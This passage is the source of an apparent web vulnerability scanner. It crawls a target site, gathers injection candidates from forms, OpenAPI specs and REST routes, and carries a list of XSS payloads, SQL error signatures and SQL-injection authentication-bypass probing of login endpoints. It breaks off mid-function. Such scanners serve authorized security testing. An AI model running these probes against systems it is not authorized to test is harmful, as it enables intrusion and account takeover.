import json
import hashlib
import os
import re
import shutil
import subprocess
import tempfile
import time
import uuid
from difflib import SequenceMatcher
from html.parser import HTMLParser
from urllib.parse import (
    parse_qsl,
    quote,
    urldefrag,
    urlencode,
    urljoin,
    urlparse,
    urlsplit,
    urlunparse,
    urlunsplit,
)

import requests

try:
    from .common import (
        add_vulnerability,
        build_session,
        connect_db,
        finish_scan,
        get_depth_config,
        get_scope_root,
        normalize_target_url,
        same_origin,
        start_scan,
    )
except ImportError:
    from common import (
        add_vulnerability,
        build_session,
        connect_db,
        finish_scan,
        get_depth_config,
        get_scope_root,
        normalize_target_url,
        same_origin,
        start_scan,
    )

DEFAULT_TIMEOUT = 8
DEFAULT_MAX_PAGES = 15
DEFAULT_MAX_CANDIDATES = 80
# Maximum number of time-based probes per scan to keep total time reasonable
DEFAULT_MAX_TIME_PROBES = 5
# Seconds to sleep in time-based SQLi payloads
TIME_SLEEP_SECONDS = 5
# Minimum extra delay (seconds) over baseline to consider time-based SQLi confirmed
TIME_THRESHOLD = 4.0
# Max pages to use for guess-based candidate generation (to avoid explosion)
MAX_GUESS_PAGES = 5

# Browser-side routes are invisible to ``requests`` because URL fragments are
# never sent to the server.  These probes cover common SPA search/tracking
# routes and are validated in a real Chromium DOM before being reported.
DOM_XSS_ROUTES = (
    ("#/search", "q"),
    ("#/track-result", "id"),
)
DOM_XSS_ATTRIBUTE = "data-scanforge-xss"
DOM_BROWSER_TIMEOUT = 20
# Most common params to try when guessing (subset of XSS/SQLI_PARAM_NAMES)
TOP_GUESS_PARAMS_XSS = {"q", "query", "search", "s", "name", "message", "email", "input"}
TOP_GUESS_PARAMS_SQLI = {"id", "q", "query", "search", "user", "product", "category", "page"}

COMMON_CRAWL_PATHS = [
    "",
    "index.php",
    "index.html",
    "search",
    "search.php",
    "login",
    "login.php",
    "contact",
    "contact.php",
    "comment",
    "comments",
    "guestbook",
    "guestbook.php",
    "product",
    "products",
    "item",
    "items",
    "user",
    "users",
    "vulnerable.php",
    "vuln.php",
    "sqli.php",
    "xss.php",
    "test.php",
    # Common vulnerable-app paths (DVWA, WebGoat, bWAPP, etc.)
    "vulnerabilities",
    "vulnerabilities/sqli",
    "vulnerabilities/xss_r",
    "vulnerabilities/xss_s",
    "vulnerabilities/exec",
    "vulnerabilities/fi",
    "vulnerabilities/csrf",
    "vulnerabilities/upload",
    "vulnerabilities/brute",
    # Juice Shop specific paths
    "rest/products/search",
    "#/search",
    # bWAPP
    "sqli_1.php",
    "sqli_2.php",
    "xss_get.php",
    "xss_post.php",
    "htmli_get.php",
    # Common web app sections
    "admin",
    "dashboard",
    "profile",
    "account",
    "api",
    "register",
    "signup",
    "feedback",
    "forum",
    "blog",
    "page",
    "view",
    "show",
    "detail",
    "details",
]

# ─── REST API Endpoints for SPA Testing ──────────────────────────────────────
# When HTML crawling finds no forms (SPA indicator), these endpoints are probed
# directly. Each entry is (method, path, param, default_value, purpose).

COMMON_API_ENDPOINTS = [
    # --- Search endpoints (XSS + SQLi) ---
    ("get", "rest/products/search", "q", "test", "both"),
    ("get", "api/Products", "q", "test", "both"),
    ("get", "api/search", "q", "test", "both"),
    ("get", "search", "q", "test", "both"),
    ("get", "search", "query", "test", "both"),
    ("get", "search", "term", "test", "both"),
    ("get", "search", "s", "test", "both"),
    ("get", "search", "keyword", "test", "both"),
    # --- User/Auth endpoints (SQLi) ---
    ("get", "api/Users", "id", "1", "sqli"),
    ("get", "api/Users", "q", "admin", "sqli"),
    ("get", "rest/user/whoami", "id", "1", "sqli"),
    ("get", "api/Products", "id", "1", "sqli"),
    ("get", "api/Feedbacks", "id", "1", "sqli"),
    ("get", "api/Challenges", "id", "1", "sqli"),
    # --- Feedback/Comment endpoints (XSS) ---
    ("get", "api/Feedbacks", "q", "test", "xss"),
    ("get", "rest/chatbot/respond", "q", "test", "xss"),
    # --- Generic REST patterns ---
    ("get", "api/v1/search", "q", "test", "both"),
    ("get", "api/v2/search", "q", "test", "both"),
    ("get", "api/v1/users", "id", "1", "sqli"),
    ("get", "api/v1/products", "id", "1", "sqli"),
    ("get", "api/items", "id", "1", "sqli"),
    ("get", "api/posts", "id", "1", "sqli"),
    ("get", "api/articles", "id", "1", "sqli"),
]

# REST API login endpoints to test for SQLi auth bypass
REST_LOGIN_ENDPOINTS = [
    # (path, email_field, password_field)
    ("rest/user/login", "email", "password"),
    ("api/login", "email", "password"),
    ("api/login", "username", "password"),
    ("api/auth/login", "email", "password"),
    ("api/auth/login", "username", "password"),
    ("api/v1/login", "email", "password"),
    ("api/v1/auth", "email", "password"),
    ("login", "email", "password"),
    ("login", "username", "password"),
    ("auth/login", "email", "password"),
]

XSS_PARAM_NAMES = {
    "q",
    "query",
    "search",
    "s",
    "name",
    "message",
    "comment",
    "text",
    "input",
    "keyword",
    "title",
    "description",
    "content",
    "term",
    "email",
    "username",
    "value",
    "data",
    "body",
    "url",
    "redirect",
    "page",
    "lang",
    "ref",
    "callback",
}

SQLI_PARAM_NAMES = {
    "id",
    "uid",
    "user",
    "userid",
    "user_id",
    "product",
    "product_id",
    "item",
    "item_id",
    "cat",
    "category",
    "category_id",
    "page",
    "post",
    "post_id",
    "article",
    "article_id",
    "q",
    "query",
    "search",
    "username",
    "email",
    "name",
    "order",
    "sort",
    "column",
    "table",
    "dir",
    "type",
    "filter",
    "view",
    "report",
    "no",
    "num",
    "number",
}

INJECTABLE_INPUT_TYPES = {
    "",
    "text",
    "search",
    "email",
    "url",
    "tel",
    "number",
    "password",
    "textarea",
    "select",
    "hidden",
}

SKIP_INPUT_TYPES = {"submit", "button", "reset", "file", "image"}

# ─── XSS Payloads ────────────────────────────────────────────────────────────
# Unique marker so we can distinguish scanner-injected content from page content
_XSS_MARKER = "XSS_SCAN"

XSS_PAYLOADS = [
    # Basic script injection
    f'<script>alert("{_XSS_MARKER}")</script>',
    # Break out of attribute context (double quote)
    f'"><script>alert("{_XSS_MARKER}")</script>',
    f'"><img src=x onerror=alert("{_XSS_MARKER}")>',
    f'"><svg/onload=alert("{_XSS_MARKER}")>',
    # Break out of attribute context (single quote)
    f"'><script>alert('{_XSS_MARKER}')</script>",
    f"'><img src=x onerror=alert('{_XSS_MARKER}')>",
    # Event handler injection without new tags (attribute context bypass)
    f'" onfocus="alert(\'{_XSS_MARKER}\')" autofocus="',
    f"' onfocus='alert(\"{_XSS_MARKER}\")' autofocus='",
    f'" onmouseover="alert(\'{_XSS_MARKER}\')" style="position:fixed;top:0;left:0;width:100%;height:100%" "',
    # SVG injection
    f'<svg onload=alert("{_XSS_MARKER}")>',
    # Body/details/marquee event handlers
    f'<body onload=alert("{_XSS_MARKER}")>',
    f'<details open ontoggle=alert("{_XSS_MARKER}")>',
    f'<marquee onstart=alert("{_XSS_MARKER}")>',
    # IMG with various event handlers
    f'<img src=x onerror=alert("{_XSS_MARKER}")>',
    f'<img/src=x onerror=alert("{_XSS_MARKER}")>',
    # Case variation bypass
    f'<ScRiPt>alert("{_XSS_MARKER}")</ScRiPt>',
    f'<IMG SRC=x ONERROR=alert("{_XSS_MARKER}")>',
    # Break out of common raw-text HTML contexts
    f'</textarea><svg/onload=alert("{_XSS_MARKER}")>',
    f'</title><svg/onload=alert("{_XSS_MARKER}")>',
    f'</script><svg/onload=alert("{_XSS_MARKER}")>',
    # Iframe/srcdoc context
    f'<iframe srcdoc="<svg onload=alert(\'{_XSS_MARKER}\')>"></iframe>',
    # JavaScript URI (for href/src attributes)
    f'javascript:alert("{_XSS_MARKER}")',
    # Polyglot payload — works in multiple contexts
    f"'-alert(\"{_XSS_MARKER}\")-'",
    f"\"-alert(\"{_XSS_MARKER}\")-\"",
    # Template literal injection
    f'${{alert("{_XSS_MARKER}")}}',
    # Encoded angle brackets (some apps decode server-side)
    f'%3Cscript%3Ealert("{_XSS_MARKER}")%3C/script%3E',
]

# ─── SQL Error Patterns ──────────────────────────────────────────────────────
SQL_ERRORS = [
    # MySQL / MariaDB
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysqli_",
    "sql syntax",
    "mysql error",
    "mariadb",
    "check the manual that corresponds to your mysql server version",
    "check the manual that corresponds to your mariadb server version",
    # Generic SQL
    "sqlstate",
    "pdoexception",
    "sql error",
    'near "',
    "unclosed quotation",
    "unterminated quoted string",
    "quoted string not properly terminated",
    # PostgreSQL
    "postgresql",
    "pg_query",
    "pg_exec",
    "pg_prepare",
    "error: syntax error at or near",
    "valid_schema_name",
    # Oracle
    "oracle error",
    "ora-",
    "ora-01756",
    "ora-00933",
    # SQLite
    "sqlite",
    "sqlite3",
    "sqlite_error",
    "sqlite3::query",
    # SQL Server (MSSQL)
    "microsoft sql",
    "mssql",
    "sql server",
    "unclosed quotation mark after the character string",
    "conversion failed when converting",
    "incorrect syntax near",
    "the multi-part identifier",
    # ODBC / JDBC
    "odbc",
    "jdbc",
    "driver[",
    "[microsoft][odbc",
    # Framework-specific error pages
    "sqlexception",
    "wpdb::prepare",
    "pdo::query",
    "doctrine\\dbal",
    "sequelize",
    "knex:",
    "activerecord::statementerror",
    # Python frameworks
    "operationalerror",
    "programmingerror",
    "django.db.utils",
    "sqlalchemy.exc",
    # PHP frameworks
    "illuminate\\database",
    # General patterns
    "unexpected end of sql",
    "warning: pg_",
    "warning: sqlite",
    "dynamic sql error",
    "unrecognized token",
    "sqlcode=",
    "sqlstate=",
    "db2 sql error",
    "sybase message",
    "syntax error in query expression",
    "unterminated quoted identifier",
]

NO_RESULT_TOKENS = [
    "no result",
    "no results",
    "not found",
    "aucun résultat",
    "aucun resultat",
    "0 rows",
    "0 results",
    "empty set",
    "no records",
    "no data",
    "no match",
    "no matches",
    "nothing found",
    "zero results",
    "were not found",
    "was not found",
    "doesn't exist",
    "does not exist",
    "no entries",
]

RESULT_TOKENS = [
    "result",
    "results",
    "record",
    "records",
    "row",
    "rows",
    "username",
    "email",
    "first name",
    "first_name",
    "surname",
    "last name",
    "last_name",
    "password",
    "admin",
    "user id",
    "user_id",
    "id:",
    "name:",
    # Extra patterns common in data dumps
    "<td>",
    "<tr>",
    "table",
]


# ─── HTML Parsing ─────────────────────────────────────────────────────────────

class FormAndLinkParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links = []
        self.scripts = []
        self.forms = []
        self._form = None
        self._textarea = None
        self._select = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        tag = tag.lower()

        if tag == "script" and attrs.get("src"):
            self.scripts.append(attrs["src"])
            return

        if tag == "a" and attrs.get("href"):
            self.links.append(attrs["href"])
            return

        if tag == "form":
            self._form = {
                "method": attrs.get("method", "get").lower(),
                "action": attrs.get("action", ""),
                "fields": [],
            }
            return

        if not self._form:
            return

        if tag == "input":
            name = attrs.get("name")
            if not name:
                return
            input_type = attrs.get("type", "text").lower()
            self._form["fields"].append(
                {"name": name, "type": input_type, "value": attrs.get("value", "")}
            )
        elif tag == "textarea":
            name = attrs.get("name")
            if name:
                self._textarea = {"name": name, "type": "textarea", "value": ""}
        elif tag == "select":
            name = attrs.get("name")
            if name:
                self._select = {"name": name, "type": "select", "value": ""}
        elif tag == "option" and self._select and not self._select["value"]:
            self._select["value"] = attrs.get("value", "")

    def handle_data(self, data):
        if self._textarea is not None:
            self._textarea["value"] += data

    def handle_endtag(self, tag):
        tag = tag.lower()
        if tag == "textarea" and self._form and self._textarea:
            self._form["fields"].append(self._textarea)
            self._textarea = None
        elif tag == "select" and self._form and self._select:
            self._form["fields"].append(self._select)
            self._select = None
        elif tag == "form" and self._form:
            if self._form["method"] not in ("get", "post"):
                self._form["method"] = "get"
            self.forms.append(self._form)
            self._form = None


# ─── Utility Functions ────────────────────────────────────────────────────────

def _compact(text):
    return " ".join(text.lower().split())[:12000]


def _similar(a, b):
    return SequenceMatcher(None, _compact(a), _compact(b)).ratio()


def _join_url(root, path):
    if not path:
        return root
    return f"{root.rstrip('/')}/{path.strip('/')}"


def _absolute_url(base, href):
    if not href:
        return base
    absolute = urljoin(base if base.endswith("/") else f"{base}/", href)
    absolute, _ = urldefrag(absolute)
    return absolute


def _with_params(url, params):
    parsed = urlsplit(url)
    existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
    existing.update({k: v for k, v in params.items() if k})
    return urlunsplit(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            urlencode(existing),
            parsed.fragment,
        )
    )


def _parse_page(response):
    parser = FormAndLinkParser()
    content_type = response.headers.get("Content-Type", "")
    if (
        "html" not in content_type.lower()
        and "<html" not in response.text[:500].lower()
    ):
        return parser
    parser.feed(response.text)
    return parser


def _is_auth_redirect(response, requested_url):
    """Check if the response was redirected to a login page."""
    requested_path = urlparse(requested_url).path.lower()
    final_path = urlparse(response.url).path.lower()
    if not response.history:
        return False
    login_indicators = ("login", "signin", "sign-in", "auth", "sso", "cas/login")
    return (
        any(ind in final_path for ind in login_indicators)
        and not any(ind in requested_path for ind in login_indicators)
    )


def _count_table_rows(html_text):
    """Count <tr> tags in HTML — useful for detecting data differences."""
    return html_text.lower().count("<tr")


# ─── Page & Form Discovery ───────────────────────────────────────────────────

def _discover_pages_and_forms(session, root, timeout, max_pages):
    """Crawl the target to discover pages and forms.

    Unlike the previous version, auth-redirected pages are logged as warnings
    but the crawl continues (the session may have valid cookies for other paths).
    """
    seen_pages = set()
    queue = []
    auth_warnings = []

    for path in COMMON_CRAWL_PATHS:
        queue.append(_join_url(root, path))

    pages = []
    forms = []
    scripts = []
    content_signatures = set()

    while queue and len(pages) < max_pages:
        page_url = queue.pop(0)
        if page_url in seen_pages or not same_origin(page_url, root):
            continue
        seen_pages.add(page_url)

        try:
            response = session.get(page_url, timeout=timeout, allow_redirects=True)
        except requests.exceptions.RequestException:
            continue

        if response.status_code >= 400:
            continue

        # SPA routers frequently return the exact same entry document for
        # every unknown path. Keep one copy so guessed routes do not multiply
        # identical injection candidates.
        content_signature = hashlib.sha256(response.content).digest()
        if content_signature in content_signatures:
            continue
        content_signatures.add(content_signature)

        content_type = response.headers.get("Content-Type", "").lower()
        if "html" not in content_type and "xhtml" not in content_type:
            continue

        # Log auth redirect as warning but still try to parse the landing page
        # (the login page itself may have forms we can discover).
        if _is_auth_redirect(response, page_url):
            auth_warnings.append(page_url)
            print(
                f"  [!] Auth redirect: {page_url} -> {response.url} "
                f"(page is behind authentication — provide a session cookie)"
            )
            # Still parse the login page for forms (but don't add to injectable pages)
            parser = _parse_page(response)
            for src in parser.scripts:
                script_url = _absolute_url(response.url, src)
                if same_origin(script_url, root) and script_url not in scripts:
                    scripts.append(script_url)
            for href in parser.links:
                absolute = _absolute_url(response.url, href)
                if (
                    same_origin(absolute, root)
                    and absolute not in seen_pages
                    and len(queue) < max_pages * 3
                ):
                    queue.append(absolute)
            continue

        pages.append(response.url)
        parser = _parse_page(response)

        for src in parser.scripts:
            script_url = _absolute_url(response.url, src)
            if same_origin(script_url, root) and script_url not in scripts:
                scripts.append(script_url)

        for form in parser.forms:
            action_url = _absolute_url(response.url, form.get("action", ""))
            if same_origin(action_url, root):
                forms.append(
                    {**form, "page_url": response.url, "action_url": action_url}
                )

        for href in parser.links:
            absolute = _absolute_url(response.url, href)
            if (
                same_origin(absolute, root)
                and absolute not in seen_pages
                and len(queue) < max_pages * 3
            ):
                queue.append(absolute)

    if auth_warnings:
        print(
            f"  [!] {len(auth_warnings)} page(s) skipped due to auth redirect. "
            f"Provide a valid session cookie for better coverage."
        )

    return pages, forms, scripts


def _field_default(field, purpose):
    value = field.get("value") or ""
    if value:
        return value
    name = field.get("name", "").lower()
    if purpose == "sqli" or "id" in name or field.get("type") == "number":
        return "1"
    if field.get("type") == "email" or "email" in name:
        return "scanner@example.local"
    return "test"


def _candidate_key(candidate):
    data_keys = tuple(sorted(candidate.get("base_data", {}).keys()))
    param_keys = tuple(sorted(candidate.get("base_params", {}).keys()))
    return (
        candidate["method"],
        candidate["url"],
        candidate["param"],
        candidate.get("param_location", "auto"),
        data_keys,
        param_keys,
    )


def _dedupe(candidates):
    seen = set()
    unique = []
    for candidate in candidates:
        key = _candidate_key(candidate)
        if key in seen:
            continue
        seen.add(key)
        unique.append(candidate)
    return unique


def _direct_query_candidates(url):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    if not params:
        return []
    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
    return [
        {
            "method": "get",
            "url": base_url,
            "param": key,
            "base_data": {**params, key: value or "test"},
            "source": "url",
        }
        for key, value in params.items()
    ]


def _page_guess_candidates(pages, purpose):
    # Use a REDUCED set of param names and pages to avoid candidate explosion.
    # API-probed candidates (added elsewhere) are much higher value.
    names = TOP_GUESS_PARAMS_XSS if purpose == "xss" else TOP_GUESS_PARAMS_SQLI
    value = "test" if purpose == "xss" else "1"
    candidates = []
    limited_pages = pages[:MAX_GUESS_PAGES]
    for page in limited_pages:
        for name in names:
            candidates.append(
                {
                    "method": "get",
                    "url": page,
                    "param": name,
                    "base_data": {name: value},
                    "source": "guess",
                }
            )
    return candidates


def _form_candidates(forms, purpose):
    candidates = []
    for form in forms:
        fields = form.get("fields", [])
        if not fields:
            continue

        base_data = {}
        injectable = []
        for field in fields:
            name = field.get("name")
            input_type = field.get("type", "text").lower()
            if not name or input_type in SKIP_INPUT_TYPES:
                continue
            base_data[name] = _field_default(field, purpose)
            # Preserve hidden CSRF/state fields in the request, but do not
            # inject into them unless their name actually looks user-controlled.
            hidden_is_relevant = input_type != "hidden" or (
                name.lower() in XSS_PARAM_NAMES
                or name.lower() in SQLI_PARAM_NAMES
            )
            if input_type in INJECTABLE_INPUT_TYPES and hidden_is_relevant:
                injectable.append(name)

        for name in injectable:
            candidates.append(
                {
                    "method": form.get("method", "get"),
                    "url": form.get("action_url"),
                    "param": name,
                    "base_data": dict(base_data),
                    "source": f"form:{form.get('page_url')}",
                }
            )
    return candidates


def _is_missing_endpoint_response(response):
    """Recognize framework/router errors that do not prove endpoint existence."""
    if response.status_code in {404, 405, 501}:
        return True
    content_type = response.headers.get("Content-Type", "").lower()
    if "html" in content_type and _looks_like_spa_html(response.text):
        return True
    lowered = response.text[:8000].lower()
    routing_errors = (
        "unexpected path:",
        "cannot get /",
        "cannot post /",
        "cannot put /",
        "cannot patch /",
        "no route matches",
        "route not found",
        "endpoint not found",
    )
    return response.status_code >= 400 and any(
        marker in lowered for marker in routing_errors
    )


def _api_candidates(root, session, timeout, purpose="both"):
    """Generate injection candidates from known REST API endpoint patterns.

    This is critical for SPAs (Juice Shop, React/Angular apps) where HTML
    crawling finds zero forms because everything is loaded via JavaScript.
    """
    candidates = []
    for method, path, param, default_value, ep_purpose in COMMON_API_ENDPOINTS:
        if purpose != "both" and ep_purpose != "both" and ep_purpose != purpose:
            continue

        url = f"{root.rstrip('/')}/{path.strip('/')}"
        # Quick probe to see if the endpoint exists
        try:
            test_data = {param: default_value}
            if method == "get":
                resp = session.get(
                    _with_params(url, test_data), timeout=timeout, allow_redirects=True
                )
            else:
                resp = session.post(
                    url, json=test_data, timeout=timeout, allow_redirects=True
                )
            # Reject non-existent SPA fallback pages. A 400/401/403/422/500
            # API response can still prove that an endpoint exists.
            if _is_missing_endpoint_response(resp):
                continue
        except requests.exceptions.RequestException:
            continue

        candidates.append({
            "method": method,
            "url": url,
            "param": param,
            "base_data": {param: default_value},
            "source": "api_probe",
        })

    return candidates


def _rest_login_sqli_candidates(root, session, timeout):
    """Generate SQLi candidates specifically for REST API login endpoints.

    Tests POST JSON login endpoints for SQL injection auth bypass.
    These are separate because they use JSON body, not URL params.
    """
    candidates = []
    for path, email_field, password_field in REST_LOGIN_ENDPOINTS:
        url = f"{root.rstrip('/')}/{path.strip('/')}"
        # Quick probe to see if the endpoint exists
        try:
            test_data = {email_field: "test@test.com", password_field: "test"}
            resp = session.post(
                url, json=test_data, timeout=timeout, allow_redirects=True
            )
            if _is_missing_endpoint_response(resp):
                continue
            # 401/200/500 all indicate the endpoint exists
        except requests.exceptions.RequestException:
            continue

        # Add the email field as injectable (classic SQLi auth bypass)
        candidates.append({
            "method": "post",
            "url": url,
            "param": email_field,
            "base_data": {email_field: "test@test.com", password_field: "test"},
            "source": f"rest_login:{path}",
            "json_mode": True,  # Flag for JSON body instead of form data
        })

    return candidates


def _candidate_purposes(param):
    """Classify an input name without assuming a particular framework."""
    lowered = str(param).lower()
    purposes = set()
    if lowered in XSS_PARAM_NAMES or any(
        hint in lowered
        for hint in ("search", "query", "comment", "message", "text", "title", "name")
    ):
        purposes.add("xss")
    if lowered in SQLI_PARAM_NAMES or any(
        hint in lowered
        for hint in ("id", "user", "email", "filter", "sort", "category", "product")
    ):
        purposes.add("sqli")
    return purposes or {"xss", "sqli"}


def _schema_properties(spec, schema):
    """Resolve one local OpenAPI schema and return its properties."""
    if not isinstance(schema, dict):
        return {}
    reference = schema.get("$ref", "")
    if reference.startswith("#/"):
        current = spec
        try:
            for part in reference[2:].split("/"):
                current = current[part.replace("~1", "/").replace("~0", "~")]
            schema = current
        except (KeyError, TypeError):
            return {}
    return schema.get("properties", {}) if isinstance(schema, dict) else {}


def _openapi_candidates(root, session, timeout):
    """Build candidates from exposed OpenAPI/Swagger metadata."""
    docs = (
        "openapi.json",
        "swagger.json",
        "api-docs",
        "api-docs/swagger.json",
        "api-docs/swagger-ui-init.js",
        "v3/api-docs",
    )
    spec = None
    for path in docs:
        try:
            response = session.get(_join_url(root, path), timeout=timeout, allow_redirects=True)
            if response.status_code != 200:
                continue
            try:
                candidate_spec = response.json()
            except ValueError:
                # swagger-ui-express commonly embeds the full OpenAPI object
                # as `"swaggerDoc": {...}` in swagger-ui-init.js.
                match = re.search(r'["\']swaggerDoc["\']\s*:\s*', response.text)
                if not match:
                    continue
                candidate_spec, _ = json.JSONDecoder().raw_decode(
                    response.text, match.end()
                )
            if isinstance(candidate_spec, dict) and isinstance(candidate_spec.get("paths"), dict):
                spec = candidate_spec
                break
        except (requests.exceptions.RequestException, ValueError):
            continue
    if spec is None:
        return []

    api_root = root
    base_path = spec.get("basePath")
    if isinstance(base_path, str) and base_path.strip("/"):
        api_root = _join_url(root, base_path)
    servers = spec.get("servers", [])
    if isinstance(servers, list) and servers and isinstance(servers[0], dict):
        server_url = servers[0].get("url", "")
        if isinstance(server_url, str) and "{" not in server_url:
            absolute_server = urljoin(root.rstrip("/") + "/", server_url)
            if same_origin(absolute_server, root):
                api_root = absolute_server.rstrip("/")

    candidates = []
    for path, path_item in list(spec["paths"].items())[:100]:
        if not isinstance(path_item, dict):
            continue
        shared_parameters = path_item.get("parameters", [])
        if not isinstance(shared_parameters, list):
            shared_parameters = []
        for method in ("get", "post", "put", "patch"):
            operation = path_item.get(method)
            if not isinstance(operation, dict):
                continue
            operation_parameters = operation.get("parameters", [])
            if not isinstance(operation_parameters, list):
                operation_parameters = []
            parameters = list(shared_parameters) + operation_parameters
            base_query = {}
            base_body = {}
            injectable = []
            resolved_path = path

            for parameter in parameters:
                if not isinstance(parameter, dict) or not parameter.get("name"):
                    continue
                name = parameter["name"]
                location = parameter.get("in", "query")
                schema = parameter.get("schema", {})
                if not isinstance(schema, dict):
                    schema = {}
                default = schema.get(
                    "example", schema.get("default", parameter.get("example", "test"))
                )
                if location == "query":
                    base_query[name] = str(default)
                    injectable.append((name, False, "query"))
                elif location == "path":
                    resolved_path = resolved_path.replace(
                        "{" + name + "}", str(default if default != "test" else "1")
                    )
                elif location == "body":
                    for prop, details in _schema_properties(spec, schema).items():
                        details = details if isinstance(details, dict) else {}
                        base_body[prop] = str(
                            details.get("example", details.get("default", "test"))
                        )
                        injectable.append((prop, True, "body"))
                elif location == "formData":
                    base_body[name] = str(default)
                    injectable.append((name, False, "body"))

            request_body = operation.get("requestBody", {})
            if not isinstance(request_body, dict):
                request_body = {}
            content = request_body.get("content", {})
            if not isinstance(content, dict):
                content = {}
            json_media = content.get("application/json", {})
            if not isinstance(json_media, dict):
                json_media = {}
            json_schema = json_media.get("schema", {})
            uses_json_body = bool(json_schema)
            for prop, details in _schema_properties(spec, json_schema).items():
                details = details if isinstance(details, dict) else {}
                base_body[prop] = str(
                    details.get("example", details.get("default", "test"))
                )
                injectable.append((prop, True, "body"))

            for name, json_mode, location in injectable:
                candidates.append(
                    {
                        "method": method,
                        "url": _join_url(api_root, resolved_path),
                        "param": name,
                        "base_data": dict(base_query if method == "get" else base_body),
                        "base_params": dict(base_query if method != "get" else {}),
                        "param_location": location,
                        "source": "openapi",
                        "json_mode": bool(
                            json_mode
                            or (location == "query" and base_body and uses_json_body)
                        ),
                        "purposes": _candidate_purposes(name),
                    }
                )
    return candidates


def _javascript_candidates(root, pages, scripts, session, timeout, max_scripts):
    """Extract real query-bearing endpoints from crawled HTML and JS bundles."""
    discovered_urls = set(pages)
    path_pattern = re.compile(
        r"[\"'`](\/[^\"'`\s<>]{1,220}\?[A-Za-z_][^\"'`\s<>]{0,180})[\"'`]"
    )
    total_bytes = 0
    for script_url in scripts[:max_scripts]:
        try:
            response = session.get(script_url, timeout=timeout, allow_redirects=True)
        except requests.exceptions.RequestException:
            continue
        if response.status_code >= 400:
            continue
        total_bytes += len(response.content)
        if total_bytes > 15_000_000:
            break
        for match in path_pattern.finditer(response.text.replace("\\/", "/")):
            absolute = urljoin(root.rstrip("/") + "/", match.group(1))
            if same_origin(absolute, root):
                discovered_urls.add(absolute)

    candidates = []
    for discovered_url in discovered_urls:
        parsed = urlparse(discovered_url)
        params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        if not params:
            continue
        base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
        for name, value in params.items():
            candidates.append(
                {
                    "method": "get",
                    "url": base_url,
                    "param": name,
                    "base_data": {**params, name: value or "test"},
                    "source": "javascript",
                    "purposes": _candidate_purposes(name),
                }
            )
    return candidates


def _for_purpose(candidates, purpose):
    return [
        candidate
        for candidate in candidates
        if purpose in candidate.get("purposes", {"xss", "sqli"})
    ]


def _build_candidates(
    url_cible, session, scan_target, crawl_root, timeout, max_pages, max_candidates,
    max_scripts=6,
):
    pages, forms, scripts = _discover_pages_and_forms(
        session, crawl_root, timeout, max_pages
    )
    for page in (scan_target, crawl_root):
        if page not in pages:
            pages.insert(0, page)

    direct = _direct_query_candidates(url_cible)
    discovered = _javascript_candidates(
        crawl_root, pages, scripts, session, timeout, max_scripts
    )
    documented = _openapi_candidates(crawl_root, session, timeout)

    # Detect if this is a SPA (no forms found from crawling)
    is_spa = len(forms) == 0
    if is_spa:
        print("  [i] Aucun formulaire HTML détecté — probable SPA. Activation du probing REST API...")

    # Always try API probing (works on both SPAs and traditional apps)
    api_xss = _api_candidates(crawl_root, session, timeout, "xss")
    api_sqli = _api_candidates(crawl_root, session, timeout, "sqli")
    login_sqli = _rest_login_sqli_candidates(crawl_root, session, timeout)

    if api_xss or api_sqli:
        print(f"  [i] Endpoints API découverts: {len(api_xss)} XSS, {len(api_sqli)} SQLi")
    if login_sqli:
        print(f"  [i] Endpoints login REST découverts: {len(login_sqli)}")

    if discovered or documented:
        print(
            f"  [i] Candidats génériques: {len(discovered)} via HTML/JS, "
            f"{len(documented)} via OpenAPI"
        )

    xss_candidates = (
        direct
        + _form_candidates(forms, "xss")
        + _for_purpose(documented, "xss")
        + _for_purpose(discovered, "xss")
        + api_xss
        + _page_guess_candidates(pages, "xss")
    )
    sqli_candidates = (
        direct
        + _form_candidates(forms, "sqli")
        + _for_purpose(documented, "sqli")
        + _for_purpose(discovered, "sqli")
        + api_sqli
        + login_sqli
        + _page_guess_candidates(pages, "sqli")
    )

    return _dedupe(xss_candidates)[:max_candidates], _dedupe(sqli_candidates)[
        :max_candidates
    ]


# ─── Request Sending ─────────────────────────────────────────────────────────

def _send_candidate(session, candidate, value, timeout):
    data = dict(candidate.get("base_data", {}))
    query = dict(candidate.get("base_params", {}))
    method = candidate.get("method", "get").lower()
    json_mode = candidate.get("json_mode", False)
    location = candidate.get(
        "param_location", "query" if method == "get" else "body"
    )
    if location == "query":
        query[candidate["param"]] = value
    else:
        data[candidate["param"]] = value

    if method in {"post", "put", "patch"}:
        if json_mode:
            return session.request(
                method, candidate["url"], params=query, json=data,
                timeout=timeout, allow_redirects=True
            )
        return session.request(
            method, candidate["url"], params=query, data=data,
            timeout=timeout, allow_redirects=True
        )
    query.update(data)
    if location == "query":
        query[candidate["param"]] = value
    return session.get(candidate["url"], params=query, timeout=timeout, allow_redirects=True)


def _timed_send(session, candidate, value, timeout):
    """Send a candidate and return (response, elapsed_seconds)."""
    data = dict(candidate.get("base_data", {}))
    query = dict(candidate.get("base_params", {}))
    method = candidate.get("method", "get").lower()
    json_mode = candidate.get("json_mode", False)
    location = candidate.get(
        "param_location", "query" if method == "get" else "body"
    )
    if location == "query":
        query[candidate["param"]] = value
    else:
        data[candidate["param"]] = value

    start = time.monotonic()
    if method in {"post", "put", "patch"}:
        if json_mode:
            resp = session.request(
                method, candidate["url"], params=query, json=data,
                timeout=max(timeout, TIME_SLEEP_SECONDS + 5),
                allow_redirects=True,
            )
        else:
            resp = session.request(
                method, candidate["url"], params=query, data=data,
                timeout=max(timeout, TIME_SLEEP_SECONDS + 5),
                allow_redirects=True,
            )
    else:
        query.update(data)
        if location == "query":
            query[candidate["param"]] = value
        resp = session.get(
            candidate["url"], params=query,
            timeout=max(timeout, TIME_SLEEP_SECONDS + 5),
            allow_redirects=True,
        )
    elapsed = time.monotonic() - start
    return resp, elapsed


# ─── XSS Detection ───────────────────────────────────────────────────────────

def _contains_raw_xss(response_text, payload, content_type=""):
    """Check if a XSS payload is reflected without proper encoding.

    Detection strategy:
    1. Exact payload match in response → confirmed.
    2. Check for key dangerous tokens (script tags, event handlers) that
